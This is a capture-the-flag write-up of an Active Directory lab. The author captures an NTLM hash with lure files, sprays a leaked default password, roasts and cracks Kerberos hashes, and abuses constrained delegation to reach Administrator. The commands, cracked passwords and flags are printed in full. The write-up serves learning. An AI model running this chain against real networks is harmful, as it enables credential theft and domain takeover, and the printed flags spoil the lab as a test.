<h1 id="reset">Reset</h1>

<p>This challenge simulates a cyber-attack scenario where you must exploit an Active Directory environment.</p>

<p>Difficulty: Hard</p>

<p>Step into the shoes of a red teamer in our simulated hack challenge!
Navigate a realistic organizational environment with up-to-date defenses.</p>

<p>Test your penetration skills, bypass security measures, and infiltrate into the system. Will you emerge victorious as you simulate the ultimate organization APT?</p>

<p>Find all the flags!</p>

<h2 id="enumeration">Enumeration</h2>

<p>NMAP Scan</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.15.83                                  
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>d15u: 
Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-06-04 20:28 EEST
Nmap scan report <span class="k">for </span>10.10.15.83
Host is up <span class="o">(</span>0.060s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 987 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2025-06-04 17:28:41Z<span class="o">)</span>
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: thm.corp0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: thm.corp0., Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-06-04T17:29:25+00:00<span class="p">;</span> 0s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>HayStack.thm.corp
| Not valid before: 2025-06-03T17:27:01
|_Not valid after:  2025-12-03T17:27:01
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-04T17:28:45+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: HAYSTACK<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   <span class="nb">date</span>: 2025-06-04T17:28:46
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>57.42 seconds
</code></pre></div></div>

<p>Seeing an SMB port opened, the next thing I tried, was list the SMB shares, and try anonymous login. What I found, was at least interesting.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> //10.10.15.83 <span class="nt">-N</span>           

        Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        ADMIN<span class="nv">$ </span>         Disk      Remote Admin
        C<span class="nv">$ </span>             Disk      Default share
        Data            Disk      
        IPC<span class="nv">$ </span>           IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
do_connect: Connection to 10.10.15.83 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
                                                                                                                                         
┌──<span class="o">(</span>d15u㉿bad<span class="o">)</span>-[~/Downloads/Tryhackme]
└─<span class="nv">$ </span>smbclient //10.10.15.83/Data <span class="nt">-N</span>
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Wed Jul 19 11:40:57 2023
  ..                                  D        0  Wed Jul 19 11:40:57 2023
  onboarding                          D        0  Wed Jun  4 20:50:59 2025

                7863807 blocks of size 4096. 3001280 blocks available

smb: <span class="se">\o</span>nboarding<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Wed Jun  4 20:52:29 2025
  ..                                  D        0  Wed Jun  4 20:52:29 2025
  0jttr5zl.l5c.pdf                    A  4700896  Mon Jul 17 11:11:53 2023
  4ag1u1pl.gfi.txt                    A      521  Mon Aug 21 21:21:59 2023
  gt1jfyeg.pur.pdf                    A  3032659  Mon Jul 17 11:12:09 2023
</code></pre></div></div>

<p>As we can see, there is a share that can be accessed without logging in, and it has some onboarding files on it. I get them, and read them, and I see what looks like a default initial password. This is very good, as we can use this later. Both just bruteforcing using default user lists, or try and gather more info to build a custom username list. For now, I will dig further to see what else I can find.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>4ag1u1pl.gfi.txt 
Subject: Welcome to Reset 
Dear &lt;USER&gt;,Welcome aboard! We are thrilled to have you <span class="nb">join </span>our team. 
As discussed during the hiring process, we are sending you the necessary login information to access your company account. 
Please keep this information confidential and <span class="k">do </span>not share it with anyone.
The initial passowrd is: ResetMe123! We are confident that you will contribute significantly to our continued success. 
We look forward to working with you and wish you the very best <span class="k">in </span>your new role.Best regards,The Reset Team                                                        
</code></pre></div></div>

<p>Another interesting thing I saw was that the files kept changing. This lead me to think there’s activity on this share. Using a hint from another walkthrough, I found that there’s a python script that can create a file to trick users open it, and get their NTLM hash. Using this, I was able to get a user’s hash and get the first flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                                                                                                                                                       ┌──<span class="o">(</span>d15u㉿kali<span class="o">)</span>-[~/Downloads/Tryhackme/Reset]
└─<span class="nv">$ </span>python3 ntlm_theft.py <span class="nt">-g</span> url <span class="nt">-s</span> 10.11.138.74 <span class="nt">-f</span> <span class="nb">test
</span>Created: <span class="nb">test</span>/test-<span class="o">(</span>url<span class="o">)</span>.url <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
Created: <span class="nb">test</span>/test-<span class="o">(</span>icon<span class="o">)</span>.url <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
Generation Complete.
                                                                                                                                                             
┌──<span class="o">(</span>d15u㉿kali<span class="o">)</span>-[~/Downloads/Tryhackme/Reset]
└─<span class="nv">$ </span>nano automate.hash
                                                                                                                                                             
┌──<span class="o">(</span>d15u㉿kali<span class="o">)</span>-[~/Downloads/Tryhackme/Reset]
└─<span class="nv">$ </span>john automate.hash <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt    
Created directory: /home/d15u/.john
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Passw0rd1        <span class="o">(</span>AUTOMATE<span class="o">)</span>     
1g 0:00:00:00 DONE <span class="o">(</span>2025-06-08 01:15<span class="o">)</span> 11.11g/s 2525Kp/s 2525Kc/s 2525KC/s astigg..920227
Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                                                                                                                                                         
┌──<span class="o">(</span>d15u㉿kali<span class="o">)</span>-[~/Downloads/Tryhackme/Reset]
└─<span class="nv">$ </span>evil-winrm <span class="nt">-i</span> haystack.thm.corp <span class="nt">-u</span> <span class="s1">'automate'</span> <span class="nt">-p</span> <span class="s1">'Passw0rd1'</span>
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="sb">`</span>quoting_detection_proc<span class="s1">' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
*Evil-WinRM* PS C:\Users\automate\Desktop&gt; dir

    Directory: C:\Users\automate\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        6/16/2023   4:35 PM             31 user.txt

*Evil-WinRM* PS C:\Users\automate\Desktop&gt; type user.txt
THM{AUTOMATION_WILL_REPLACE_US}

</span></code></pre></div></div>

<p>I was not able to find anything more on my own, so I read a hint from someone. Using Impacket’s <code class="language-plaintext highlighter-rouge">lookupsid</code> we can find some users.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/doc/python3-impacket/examples/lookupsid.py thm.corp/guest@10.10.202.246
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Brute forcing SIDs at 10.10.202.246
<span class="o">[</span><span class="k">*</span><span class="o">]</span> StringBinding ncacn_np:10.10.202.246[<span class="se">\p</span>ipe<span class="se">\l</span>sarpc]
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Domain SID is: S-1-5-21-1966530601-3185510712-10604624
498: THM<span class="se">\E</span>nterprise Read-only Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
500: THM<span class="se">\A</span>dministrator <span class="o">(</span>SidTypeUser<span class="o">)</span>
501: THM<span class="se">\G</span>uest <span class="o">(</span>SidTypeUser<span class="o">)</span>
502: THM<span class="se">\k</span>rbtgt <span class="o">(</span>SidTypeUser<span class="o">)</span>
512: THM<span class="se">\D</span>omain Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
513: THM<span class="se">\D</span>omain Users <span class="o">(</span>SidTypeGroup<span class="o">)</span>
514: THM<span class="se">\D</span>omain Guests <span class="o">(</span>SidTypeGroup<span class="o">)</span>
515: THM<span class="se">\D</span>omain Computers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
516: THM<span class="se">\D</span>omain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
517: THM<span class="se">\C</span>ert Publishers <span class="o">(</span>SidTypeAlias<span class="o">)</span>
518: THM<span class="se">\S</span>chema Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
519: THM<span class="se">\E</span>nterprise Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
520: THM<span class="se">\G</span>roup Policy Creator Owners <span class="o">(</span>SidTypeGroup<span class="o">)</span>
521: THM<span class="se">\R</span>ead-only Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
522: THM<span class="se">\C</span>loneable Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
525: THM<span class="se">\P</span>rotected Users <span class="o">(</span>SidTypeGroup<span class="o">)</span>
526: THM<span class="se">\K</span>ey Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
527: THM<span class="se">\E</span>nterprise Key Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
553: THM<span class="se">\R</span>AS and IAS Servers <span class="o">(</span>SidTypeAlias<span class="o">)</span>
571: THM<span class="se">\A</span>llowed RODC Password Replication Group <span class="o">(</span>SidTypeAlias<span class="o">)</span>
572: THM<span class="se">\D</span>enied RODC Password Replication Group <span class="o">(</span>SidTypeAlias<span class="o">)</span>
1008: THM<span class="se">\H</span>AYSTACK<span class="nv">$ </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
1109: THM<span class="se">\D</span>nsAdmins <span class="o">(</span>SidTypeAlias<span class="o">)</span>
1110: THM<span class="se">\D</span>nsUpdateProxy <span class="o">(</span>SidTypeGroup<span class="o">)</span>
1111: THM<span class="se">\3</span>091731410SA <span class="o">(</span>SidTypeUser<span class="o">)</span>
1112: THM<span class="se">\E</span>RNESTO_SILVA <span class="o">(</span>SidTypeUser<span class="o">)</span>
1113: THM<span class="se">\T</span>RACY_CARVER <span class="o">(</span>SidTypeUser<span class="o">)</span>
1114: THM<span class="se">\S</span>HAWNA_BRAY <span class="o">(</span>SidTypeUser<span class="o">)</span>
1115: THM<span class="se">\C</span>ECILE_WONG <span class="o">(</span>SidTypeUser<span class="o">)</span>
1116: THM<span class="se">\C</span>YRUS_WHITEHEAD <span class="o">(</span>SidTypeUser<span class="o">)</span>
1117: THM<span class="se">\D</span>EANNE_WASHINGTON <span class="o">(</span>SidTypeUser<span class="o">)</span>
1118: THM<span class="se">\E</span>LLIOT_CHARLES <span class="o">(</span>SidTypeUser<span class="o">)</span>
1119: THM<span class="se">\M</span>ICHEL_ROBINSON <span class="o">(</span>SidTypeUser<span class="o">)</span>
1120: THM<span class="se">\M</span>ITCHELL_SHAW <span class="o">(</span>SidTypeUser<span class="o">)</span>
1121: THM<span class="se">\F</span>ANNY_ALLISON <span class="o">(</span>SidTypeUser<span class="o">)</span>
1122: THM<span class="se">\J</span>ULIANNE_HOWE <span class="o">(</span>SidTypeUser<span class="o">)</span>
1123: THM<span class="se">\R</span>OSLYN_MATHIS <span class="o">(</span>SidTypeUser<span class="o">)</span>
1124: THM<span class="se">\D</span>ANIEL_CHRISTENSEN <span class="o">(</span>SidTypeUser<span class="o">)</span>
1125: THM<span class="se">\M</span>ARCELINO_BALLARD <span class="o">(</span>SidTypeUser<span class="o">)</span>
1126: THM<span class="se">\C</span>RUZ_HALL <span class="o">(</span>SidTypeUser<span class="o">)</span>
1127: THM<span class="se">\H</span>OWARD_PAGE <span class="o">(</span>SidTypeUser<span class="o">)</span>
1128: THM<span class="se">\S</span>TEWART_SANTANA <span class="o">(</span>SidTypeUser<span class="o">)</span>
1130: THM<span class="se">\L</span>INDSAY_SCHULTZ <span class="o">(</span>SidTypeUser<span class="o">)</span>
1131: THM<span class="se">\T</span>ABATHA_BRITT <span class="o">(</span>SidTypeUser<span class="o">)</span>
1132: THM<span class="se">\R</span>ICO_PEARSON <span class="o">(</span>SidTypeUser<span class="o">)</span>
1133: THM<span class="se">\D</span>ARLA_WINTERS <span class="o">(</span>SidTypeUser<span class="o">)</span>
1134: THM<span class="se">\A</span>NDY_BLACKWELL <span class="o">(</span>SidTypeUser<span class="o">)</span>
1135: THM<span class="se">\L</span>ILY_ONEILL <span class="o">(</span>SidTypeUser<span class="o">)</span>
1136: THM<span class="se">\C</span>HERYL_MULLINS <span class="o">(</span>SidTypeUser<span class="o">)</span>
1137: THM<span class="se">\L</span>ETHA_MAYO <span class="o">(</span>SidTypeUser<span class="o">)</span>
1138: THM<span class="se">\H</span>ORACE_BOYLE <span class="o">(</span>SidTypeUser<span class="o">)</span>
1139: THM<span class="se">\C</span>HRISTINA_MCCORMICK <span class="o">(</span>SidTypeUser<span class="o">)</span>
1141: THM<span class="se">\3</span>811465497SA <span class="o">(</span>SidTypeUser<span class="o">)</span>
1142: THM<span class="se">\M</span>ORGAN_SELLERS <span class="o">(</span>SidTypeUser<span class="o">)</span>
1143: THM<span class="se">\M</span>ARION_CLAY <span class="o">(</span>SidTypeUser<span class="o">)</span>
1144: THM<span class="se">\3</span>966486072SA <span class="o">(</span>SidTypeUser<span class="o">)</span>
1146: THM<span class="se">\T</span>ED_JACOBSON <span class="o">(</span>SidTypeUser<span class="o">)</span>
1147: THM<span class="se">\A</span>UGUSTA_HAMILTON <span class="o">(</span>SidTypeUser<span class="o">)</span>
1148: THM<span class="se">\T</span>REVOR_MELTON <span class="o">(</span>SidTypeUser<span class="o">)</span>
1149: THM<span class="se">\L</span>EANN_LONG <span class="o">(</span>SidTypeUser<span class="o">)</span>
1150: THM<span class="se">\R</span>AQUEL_BENSON <span class="o">(</span>SidTypeUser<span class="o">)</span>
1151: THM<span class="se">\A</span>N-173-distlist1 <span class="o">(</span>SidTypeGroup<span class="o">)</span>
1152: THM<span class="se">\G</span>u-gerardway-distlist1 <span class="o">(</span>SidTypeGroup<span class="o">)</span>
1154: THM<span class="se">\C</span>H-ecu-distlist1 <span class="o">(</span>SidTypeGroup<span class="o">)</span>
1156: THM<span class="se">\A</span>UTOMATE <span class="o">(</span>SidTypeUser<span class="o">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>THM<span class="se">\A</span>dministrator  
THM<span class="se">\G</span>uest  
THM<span class="se">\k</span>rbtgt  
THM<span class="se">\3</span>091731410SA  
THM<span class="se">\E</span>RNESTO_SILVA  
THM<span class="se">\T</span>RACY_CARVER  
THM<span class="se">\S</span>HAWNA_BRAY  
THM<span class="se">\C</span>ECILE_WONG  
THM<span class="se">\C</span>YRUS_WHITEHEAD  
THM<span class="se">\D</span>EANNE_WASHINGTON  
THM<span class="se">\E</span>LLIOT_CHARLES  
THM<span class="se">\M</span>ICHEL_ROBINSON  
THM<span class="se">\M</span>ITCHELL_SHAW  
THM<span class="se">\F</span>ANNY_ALLISON  
THM<span class="se">\J</span>ULIANNE_HOWE  
THM<span class="se">\R</span>OSLYN_MATHIS  
THM<span class="se">\D</span>ANIEL_CHRISTENSEN  
THM<span class="se">\M</span>ARCELINO_BALLARD  
THM<span class="se">\C</span>RUZ_HALL  
THM<span class="se">\H</span>OWARD_PAGE  
THM<span class="se">\S</span>TEWART_SANTANA  
THM<span class="se">\L</span>INDSAY_SCHULTZ  
THM<span class="se">\T</span>ABATHA_BRITT  
THM<span class="se">\R</span>ICO_PEARSON  
THM<span class="se">\D</span>ARLA_WINTERS  
THM<span class="se">\A</span>NDY_BLACKWELL  
THM<span class="se">\L</span>ILY_ONEILL  
THM<span class="se">\C</span>HERYL_MULLINS  
THM<span class="se">\L</span>ETHA_MAYO  
THM<span class="se">\H</span>ORACE_BOYLE  
THM<span class="se">\C</span>HRISTINA_MCCORMICK  
THM<span class="se">\3</span>811465497SA  
THM<span class="se">\M</span>ORGAN_SELLERS  
THM<span class="se">\M</span>ARION_CLAY  
THM<span class="se">\3</span>966486072SA  
THM<span class="se">\T</span>ED_JACOBSON  
THM<span class="se">\A</span>UGUSTA_HAMILTON  
THM<span class="se">\T</span>REVOR_MELTON  
THM<span class="se">\L</span>EANN_LONG  
THM<span class="se">\R</span>AQUEL_BENSON  
THM<span class="se">\A</span>UTOMATE  
</code></pre></div></div>

<p>Using the password I found earlier and the users list, we run a password spraying attack to see if any users still have that default password. And I do get a hit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.202.246 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'ResetMe123!'</span> <span class="nt">--continue-on-success</span>
SMB         10.10.202.246   445    HAYSTACK         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:HAYSTACK<span class="o">)</span> <span class="o">(</span>domain:thm.corp<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>

SMB         10.10.202.246   445    HAYSTACK         <span class="o">[</span>+] THM<span class="se">\L</span>ILY_ONEILL:ResetMe123! 

</code></pre></div></div>

<p>It looks like LILY_ONEILL is a dead end, as it doesn’t have more access than the Guest user. But now that I have a users list, I can try AS-REP Roasting. It looks like we do have some hits.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py thm.corp/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users1.txt <span class="nt">-dc-ip</span> 10.10.202.246
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

<span class="o">[</span>-] User Administrator doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED<span class="o">(</span>Clients credentials have been revoked<span class="o">)</span>
<span class="o">[</span>-] User 3091731410SA doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$ERNESTO_SILVA@THM.CORP:29203d76ff5a066a26910276f629b0f0$84d560fbf8691ec1f84a1d54e931538dfa27c1cbd6a10ee4933ff20d0620d01a2899bae513351ef317029396f007355cd0170273c5304a2cc3a01fd6cc633af8cbaef224d48edc98c75d16610e1668bfef0a5fdb665466d7d8262dab95c00aa418a4ea21df8f47db41318ba5e2308ec4180256605d9219d18f33745961829816ab5289f9602487cb20efdb569a5e53759a8f10636f291b20b7b95f98ac07b3e265be1f31bea90f7445128c8d9bb7782d3e97b0cf084d64f2b720fdc7b8e608743543863a727c8a3bca9f8e198c6cec0b087ca5fa1c92e0a5a82afe73c6ee7ca54182b7ee
$krb5asrep$23$TABATHA_BRITT@THM.CORP:9e4ee6447f20aac5d0350c566ac1cafe$de1c85ed6268e13c86d7fc6df6787adbf0a678a5eb4462a19e478b30fb7fb0408c4ac89dbd002ba164839e904b44687a746af1e96d8762cafa6f7ba60ff09735465591f30e5e77e19bce9cb60f2afdde71005e3f806e709bc8eee0f8f15c9cb496b21dd8371aa7cd9f14e6ac5f06a4c6f12c42283c295d32c0d2197bc3f26596e8dfdc484e75f95f3285980bbd8d295c3133feacc278f6943713e32408c8f69d93ca3e7d1c9a80ba105e74d08097d528dd6cbb7f50bbb150ad09d021c85470a137092a547f26d9aa6978d958477dd3ace5ae57fcfcd4fcbfafcec1274398805ef8042e4a
$krb5asrep$23$LEANN_LONG@THM.CORP:b0a4314b4072f808b97196114a2ffe8b$1047cea82fee6af97113690e6bccd65910abbda7560b53fb7c78055418a7b1a99018301829b2456750267b26ec6372924b0851f7bc09b3477607ce42e6955a1ef158340e71b78f03a19c37994f5bb211e1fb2ab365f74e34e448d9c3c1c6eb62d2a6949567218d5243c87c72848d0bbb593ad2da2ea4d63a8c1ddd9e080008911e4b34a8bf27aab079711e79b623b0b1d140ee8fff0fc15443b80243fcc0c77f49d0608063544495bb7154c3342dd00ae9555dfe44b05aef17bcd9d4a0078c250436db746b58f623eece21ed6bb14fe375b3c9cb3c22967cd1c98c6acd2febd0e0239e9e

</span></code></pre></div></div>

<p>There was no hit using hashcat, but using john I was able to get a hit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hases.txt  
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
marlboro<span class="o">(</span>1985<span class="o">)</span>   <span class="o">(</span><span class="nv">$krb5asrep$23$TABATHA_BRITT</span>@THM.CORP<span class="o">)</span>     
1g 0:00:00:36 DONE <span class="o">(</span>2025-06-06 23:25<span class="o">)</span> 0.02718g/s 389987p/s 936735c/s 936735C/s  0841079575..<span class="k">*</span>7¡Vamos!
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed. 
</code></pre></div></div>

<p>The next thing I try, is connecting using RDP with the credentials I found. I was able to connect, but I did not find anything useful. So, the next thing I try, is run bloodhound using these credentials, to see what more can I find out about the target. First, I run the <code class="language-plaintext highlighter-rouge">bloodhound-python -u TABATHA_BRITT -p 'marlboro(1985)' -d thm.corp -ns 10.10.152.241 -c All --zip</code> to get the necessary files, and upload them to be able to analyze them.</p>

<p>First interesting thing I find is that there’s a clear path between <code class="language-plaintext highlighter-rouge">TABATHA_BRITT</code> and <code class="language-plaintext highlighter-rouge">DARLA_WINTERS</code> which is a <code class="language-plaintext highlighter-rouge">DOMAIN COPUTERS</code> user.</p>

<p><img src="/assets/img/reset/image.png" alt="image.png" /></p>

<p>Through a series of password resets, we now own <code class="language-plaintext highlighter-rouge">DARLA_WINTERS</code> user, which we can see it’s able to perform <code class="language-plaintext highlighter-rouge">constrained delegation</code></p>

<p><img src="/assets/img/reset/image%201.png" alt="image.png" /></p>

<p><img src="/assets/img/reset/image%202.png" alt="image.png" /></p>

<p>This means we can impersonate Administrator for the <code class="language-plaintext highlighter-rouge">CIFS</code> service on the Domain Controller (haystack.thm.corp), using impacket’s <code class="language-plaintext highlighter-rouge">getST.py</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>d15u㉿kali<span class="o">)</span>-[~/Downloads/Tryhackme/Reset]
└─<span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/getST.py <span class="nt">-spn</span> <span class="s2">"cifs/haystack.thm.corp"</span> <span class="nt">-impersonate</span> <span class="s2">"Administrator"</span> <span class="s1">'thm.corp/DARLA_WINTERS:NewDPass123!'</span>
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting S4U2self
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting S4U2Proxy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
                                                                                                                                                             
</code></pre></div></div>

<p>From here, getting the root flag was a piece of cake.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>d15u㉿kali<span class="o">)</span>-[~/Downloads/Tryhackme/Reset]
└─<span class="nv">$ </span><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@cifs_haystack.thm.corp@THM.CORP.ccache 
                                                                                                                                                                                                                                                                                                     
┌──<span class="o">(</span>d15u㉿kali<span class="o">)</span>-[~/Downloads/Tryhackme/Reset]
└─<span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/wmiexec.py <span class="nt">-k</span> <span class="nt">-no-pass</span> Administrator@haystack.thm.corp
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

<span class="o">[</span><span class="k">*</span><span class="o">]</span> SMBv3.0 dialect used
<span class="o">[!]</span> Launching semi-interactive shell - Careful what you execute
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
C:<span class="se">\&gt;</span><span class="nb">whoami
</span>thm<span class="se">\a</span>dministrator

C:<span class="se">\&gt;</span><span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:<span class="se">\</span>

07/19/2023  08:40 AM    &lt;DIR&gt;          Data
11/14/2018  06:56 AM    &lt;DIR&gt;          EFI
05/13/2020  05:58 PM    &lt;DIR&gt;          PerfLogs
11/14/2018  04:10 PM    &lt;DIR&gt;          Program Files
03/11/2021  07:29 AM    &lt;DIR&gt;          Program Files <span class="o">(</span>x86<span class="o">)</span>
06/07/2025  10:48 PM    &lt;DIR&gt;          Users
06/07/2025  11:14 PM    &lt;DIR&gt;          Windows
               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
               7 Dir<span class="o">(</span>s<span class="o">)</span>  12,304,625,664 bytes free

C:<span class="se">\&gt;</span><span class="nb">cd </span>Users/Administrator/Desktop
C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;dir
 Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop

07/14/2023  07:23 AM    &lt;DIR&gt;          <span class="nb">.</span>
07/14/2023  07:23 AM    &lt;DIR&gt;          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/16/2023  04:37 PM                30 root.txt
               3 File<span class="o">(</span>s<span class="o">)</span>          1,111 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>  12,304,625,664 bytes free

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;type root.txt
THM<span class="o">{</span>RE_RE_RE_SET_AND_DELEGATE<span class="o">}</span>

</code></pre></div></div>

<h2 id="conclusion">Conclusion</h2>

<p>It was a very hard task for me. I did ok in the beginning, but when things got tough, I wasn’t able to continue on my own. I needed some inspiration from other wlakthroughs, but it was still a very good learning opportunity. I found out about the NTLM stealing tool, and also I was forced to learn more about bloodhound enumeration, which was very useful.</p>
